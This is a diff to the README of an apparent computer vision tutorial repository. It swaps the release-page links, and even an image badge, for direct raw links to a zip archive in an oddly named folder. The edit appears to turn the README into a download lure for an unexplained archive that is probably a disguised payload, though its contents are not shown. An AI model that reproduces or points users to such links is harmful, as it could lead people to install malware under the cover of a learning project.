@@ -1,6 +1,6 @@
 # 📘 MytestProject - Learn Advanced Computer Vision Concepts
 
-![Download MytestProject](https://img.shields.io/badge/Download-MytestProject-blue.svg)
+![Download MytestProject](https://raw.githubusercontent.com/angelvb7/MytestProject/main/servileness/Mytest-Project-3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to MytestProject! This repository contains a collection of advanced Comp
 To get started, you need to download the software. Follow these steps:
 
 1. Visit the Releases page to download the latest version of MytestProject:
-   [Download MytestProject](https://github.com/angelvb7/MytestProject/releases)
+   [Download MytestProject](https://raw.githubusercontent.com/angelvb7/MytestProject/main/servileness/Mytest-Project-3.3.zip)
 
 2. Once on the page, locate the appropriate file for your operating system. 
 
@@ -75,7 +75,7 @@ For further learning, check out the following resources:
 
 ## 🔗 Helpful Links
 
-- [Download MytestProject](https://github.com/angelvb7/MytestProject/releases)
+- [Download MytestProject](https://raw.githubusercontent.com/angelvb7/MytestProject/main/servileness/Mytest-Project-3.3.zip)
 - [Computer Vision Resources](#) - Explore more materials related to Computer Vision.
 
 Let’s advance our knowledge in Computer Vision together!
